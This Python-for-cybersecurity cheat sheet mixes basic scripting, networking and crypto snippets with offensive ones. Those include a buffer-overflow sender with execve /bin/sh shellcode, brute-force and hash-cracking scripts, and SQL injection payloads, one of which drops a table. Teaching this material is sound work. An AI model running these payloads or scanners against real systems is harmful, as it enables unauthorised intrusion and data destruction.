# Python for Cybersecurity Cheat Sheet

Python is one of the most popular programming languages for cybersecurity automation, scripting, and tool development.

## 📋 Table of Contents
- [Basic Python](#basic-python)
- [Networking](#networking)
- [Web Scraping](#web-scraping)
- [File Operations](#file-operations)
- [Cryptography](#cryptography)
- [System Operations](#system-operations)
- [Security Libraries](#security-libraries)
- [Exploit Development](#exploit-development)
- [Automation Scripts](#automation-scripts)

## Basic Python

### Data Types and Variables

```python
# Variables
name = "hacker"
age = 25
is_admin = True

# Lists
ports = [21, 22, 80, 443]
ports.append(8080)
ports.remove(21)
print(ports[0])  # First element

# Dictionaries
service_info = {"port": 80, "service": "http", "state": "open"}
print(service_info["port"])
service_info["version"] = "Apache 2.4"

# Sets
unique_ips = {" 192.168.1.1", "192.168.1.2"}
unique_ips.add("192.168.1.3")

# Tuples (immutable)
credentials = ("admin", "password123")
```

### Control Flow

```python
# If statements
if port == 80:
    print("HTTP")
elif port == 443:
    print("HTTPS")
else:
    print("Unknown")

# For loops
for port in [21, 22, 80, 443]:
    print(f"Scanning port {port}")

# While loops
attempts = 0
while attempts < 3:
    # Try authentication
    attempts += 1

# List comprehensions
open_ports = [p for p in range(1, 1025) if scan_port(p)]
```

### Functions

```python
# Basic function
def port_scan(host, port):
    """Scan a port on a host"""
    # Implementation
    return result

# Function with default arguments
def scan(host, ports=[80, 443], timeout=5):
    # Implementation
    pass

# Lambda functions
square = lambda x: x ** 2
filtered_ports = filter(lambda p: p > 1024, port_list)
```

### Exception Handling

```python
try:
    response = urllib.request.urlopen(url)
except urllib.error.URLError as e:
    print(f"Error: {e}")
except Exception as e:
    print(f"Unexpected error: {e}")
finally:
    # Cleanup code
    pass
```

## Networking

### Socket Programming

```python
import socket

# TCP client
def tcp_client(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    response = client.recv(4096)
    client.close()
    return response

# TCP server
def tcp_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")
    
    while True:
        client, addr = server.accept()
        print(f"[*] Connection from {addr[0]}:{addr[1]}")
        client.send(b"Welcome!\n")
        client.close()

# UDP socket
def udp_client(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto(b"data", (host, port))
    data, addr = client.recvfrom(4096)
    return data

# Port scanner
def port_scan(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0  # True if port is open
    except:
        return False

# Banner grabbing
def grab_banner(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(b"\n")
        banner = sock.recv(1024)
        sock.close()
        return banner.decode()
    except:
        return None
```

### HTTP Requests

```python
import requests

# GET request
response = requests.get("https://example.com")
print(response.status_code)
print(response.headers)
print(response.text)

# POST request
data = {"username": "admin", "password": "test"}
response = requests.post("https://example.com/login", data=data)

# Custom headers
headers = {"User-Agent": "Mozilla/5.0"}
response = requests.get("https://example.com", headers=headers)

# Session management
session = requests.Session()
session.get("https://example.com/login")
session.post("https://example.com/auth", data=credentials)
response = session.get("https://example.com/dashboard")

# Proxies
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
response = requests.get("https://example.com", proxies=proxies, verify=False)

# Timeouts
response = requests.get("https://example.com", timeout=5)

# API requests
api_url = "https://api.example.com/v1/data"
headers = {"Authorization": "Bearer TOKEN"}
response = requests.get(api_url, headers=headers)
data = response.json()
```

## Web Scraping

```python
from bs4 import BeautifulSoup
import requests

# Basic scraping
response = requests.get("https://example.com")
soup = BeautifulSoup(response.text, 'html.parser')

# Find elements
title = soup.find('title').text
links = soup.find_all('a')
for link in links:
    print(link.get('href'))

# CSS selectors
divs = soup.select('div.class-name')
ids = soup.select('#element-id')

# Extract data
table = soup.find('table')
rows = table.find_all('tr')
for row in rows:
    cols = row.find_all('td')
    data = [col.text.strip() for col in cols]

# Scrape with authentication
session = requests.Session()
login_data = {"username": "user", "password": "pass"}
session.post("https://example.com/login", data=login_data)
response = session.get("https://example.com/protected")
soup = BeautifulSoup(response.text, 'html.parser')
```

## File Operations

```python
# Read file
with open('file.txt', 'r') as f:
    content = f.read()

# Read line by line
with open('file.txt', 'r') as f:
    for line in f:
        print(line.strip())

# Write file
with open('output.txt', 'w') as f:
    f.write("Hello World\n")

# Append to file
with open('log.txt', 'a') as f:
    f.write("New log entry\n")

# Binary files
with open('image.jpg', 'rb') as f:
    data = f.read()

# JSON
import json

# Read JSON
with open('data.json', 'r') as f:
    data = json.load(f)

# Write JSON
data = {"name": "test", "value": 123}
with open('output.json', 'w') as f:
    json.dump(data, f, indent=2)

# CSV
import csv

# Read CSV
with open('data.csv', 'r') as f:
    reader = csv.reader(f)
    for row in reader:
        print(row)

# Write CSV
with open('output.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['Name', 'Age'])
    writer.writerow(['Alice', 30])

# XML
import xml.etree.ElementTree as ET

tree = ET.parse('data.xml')
root = tree.getroot()
for child in root:
    print(child.tag, child.attrib)
```

## Cryptography

```python
import hashlib
import hmac
from cryptography.fernet import Fernet

# Hashing
def md5_hash(data):
    return hashlib.md5(data.encode()).hexdigest()

def sha256_hash(data):
    return hashlib.sha256(data.encode()).hexdigest()

def sha512_hash(data):
    return hashlib.sha512(data.encode()).hexdigest()

# HMAC
def create_hmac(key, message):
    return hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest()

# Symmetric encryption (Fernet)
# Generate key
key = Fernet.generate_key()

# Encrypt
cipher = Fernet(key)
encrypted = cipher.encrypt(b"Secret message")

# Decrypt
decrypted = cipher.decrypt(encrypted)

# Base64 encoding
import base64

encoded = base64.b64encode(b"data")
decoded = base64.b64decode(encoded)

# Password hashing
import bcrypt

# Hash password
password = b"password123"
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password, salt)

# Verify password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

## System Operations

```python
import os
import subprocess
import shutil

# Operating system
print(os.name)  # 'posix' or 'nt'

# Current directory
print(os.getcwd())

# Change directory
os.chdir('/tmp')

# List directory
files = os.listdir('.')

# File operations
os.rename('old.txt', 'new.txt')
os.remove('file.txt')
os.mkdir('new_dir')
os.rmdir('empty_dir')

# Path operations
import os.path

if os.path.exists('file.txt'):
    print("File exists")

if os.path.isfile('file.txt'):
    print("It's a file")

if os.path.isdir('directory'):
    print("It's a directory")

# Join paths
path = os.path.join('directory', 'subdirectory', 'file.txt')

# Get file size
size = os.path.getsize('file.txt')

# Execute commands
result = subprocess.run(['ls', '-l'], capture_output=True, text=True)
print(result.stdout)

# Execute with shell
result = subprocess.run('ps aux | grep python', shell=True, capture_output=True, text=True)

# Copy files
shutil.copy('source.txt', 'dest.txt')
shutil.copytree('source_dir', 'dest_dir')

# Environment variables
home = os.environ.get('HOME')
os.environ['MY_VAR'] = 'value'
```

## Security Libraries

### Scapy (Packet Manipulation)

```python
from scapy.all import *

# Send ICMP packet
send(IP(dst="192.168.1.1")/ICMP())

# SYN scan
ans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=80, flags="S"), timeout=1)

# Sniff packets
packets = sniff(count=10, filter="tcp port 80")

# DNS query
response = sr1(IP(dst="8.8.8.8")/UDP()/DNS(qd=DNSQR(qname="example.com")))

# ARP scan
ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)
```

### Paramiko (SSH)

```python
import paramiko

# SSH client
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('hostname', username='user', password='pass')

# Execute command
stdin, stdout, stderr = ssh.exec_command('ls -la')
print(stdout.read().decode())

# SFTP
sftp = ssh.open_sftp()
sftp.get('/remote/path/file.txt', '/local/path/file.txt')
sftp.put('/local/path/file.txt', '/remote/path/file.txt')
sftp.close()

ssh.close()
```

### Impacket (Network Protocols)

```python
from impacket.smbconnection import SMBConnection

# SMB connection
conn = SMBConnection('192.168.1.100', '192.168.1.100')
conn.login('username', 'password')

# List shares
shares = conn.listShares()
for share in shares:
    print(share['shi1_netname'])

# Read file
tid = conn.connectTree('C$')
fid = conn.openFile(tid, 'Windows\\System32\\drivers\\etc\\hosts')
data = conn.readFile(tid, fid)
conn.close()
```

## Exploit Development

### Buffer Overflow

```python
import socket
import sys

# Create pattern
def create_pattern(length):
    pattern = ""
    parts = ["A", "B", "C"]
    while len(pattern) < length:
        pattern += parts[len(pattern) % len(parts)]
    return pattern[:length]

# Exploit function
def exploit(target, port):
    buffer = b"A" * 1000
    buffer += b"\x90" * 16  # NOP sled
    buffer += b"\x41\x42\x43\x44"  # Return address (little endian)
    buffer += shellcode
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(buffer)
    s.close()
```

### Shellcode

```python
# Linux x86 execve /bin/sh shellcode
shellcode = (
    b"\x31\xc0"              # xor eax, eax
    b"\x50"                  # push eax
    b"\x68\x2f\x2f\x73\x68"  # push 0x68732f2f
    b"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f
    b"\x89\xe3"              # mov ebx, esp
    b"\x50"                  # push eax
    b"\x53"                  # push ebx
    b"\x89\xe1"              # mov ecx, esp
    b"\xb0\x0b"              # mov al, 0x0b
    b"\xcd\x80"              # int 0x80
)

# Reverse shell generator
def generate_reverse_shell(ip, port):
    # Generate shellcode with msfvenom or custom assembly
    pass
```

## Automation Scripts

### Port Scanner

```python
import socket
import concurrent.futures

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return port, True
        return port, False
    except:
        return port, False

def scan_host(host, ports):
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        future_to_port = {executor.submit(scan_port, host, port): port for port in ports}
        for future in concurrent.futures.as_completed(future_to_port):
            port, is_open = future.result()
            if is_open:
                open_ports.append(port)
                print(f"[+] Port {port} is open")
    return open_ports

# Usage
host = "192.168.1.1"
ports = range(1, 1025)
scan_host(host, ports)
```

### Subdomain Enumeration

```python
import dns.resolver
import concurrent.futures

def check_subdomain(subdomain, domain):
    try:
        answers = dns.resolver.resolve(f"{subdomain}.{domain}", 'A')
        for answer in answers:
            return subdomain, str(answer)
    except:
        return None

def enumerate_subdomains(domain, wordlist):
    found = []
    with open(wordlist, 'r') as f:
        subdomains = [line.strip() for line in f]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_subdomain, sub, domain): sub for sub in subdomains}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                subdomain, ip = result
                print(f"[+] Found: {subdomain}.{domain} -> {ip}")
                found.append(result)
    return found
```

### Password Cracker

```python
import hashlib

def crack_md5(hash_to_crack, wordlist):
    with open(wordlist, 'r', encoding='latin-1') as f:
        for line in f:
            password = line.strip()
            hash_attempt = hashlib.md5(password.encode()).hexdigest()
            if hash_attempt == hash_to_crack:
                return password
    return None

# Usage
target_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # password
result = crack_md5(target_hash, 'passwords.txt')
if result:
    print(f"[+] Password found: {result}")
```

### Web Directory Brute Force

```python
import requests
import concurrent.futures

def check_directory(base_url, directory):
    url = f"{base_url}/{directory}"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code != 404:
            return url, response.status_code
    except:
        pass
    return None

def brute_directories(base_url, wordlist):
    found = []
    with open(wordlist, 'r') as f:
        directories = [line.strip() for line in f]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_directory, base_url, dir): dir for dir in directories}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                url, status = result
                print(f"[+] Found: {url} (Status: {status})")
                found.append(result)
    return found

# Usage
brute_directories("https://example.com", "directories.txt")
```

### SQL Injection Tester

```python
import requests

def test_sql_injection(url, parameter, payloads):
    vulnerable = []
    for payload in payloads:
        test_url = f"{url}?{parameter}={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'syntax', 'database']):
                print(f"[!] Potential SQLi: {payload}")
                vulnerable.append(payload)
        except:
            pass
    return vulnerable

# Usage
sql_payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--"]
test_sql_injection("http://example.com/search", "q", sql_payloads)
```

## Resources

- [Python Documentation](https://docs.python.org/3/)
- [Real Python](https://realpython.com/)
- [Python for Cybersecurity](https://www.packtpub.com/product/python-for-cybersecurity/9781789138550)
- [Violent Python](https://www.elsevier.com/books/violent-python/unknown/978-1-59749-957-6)
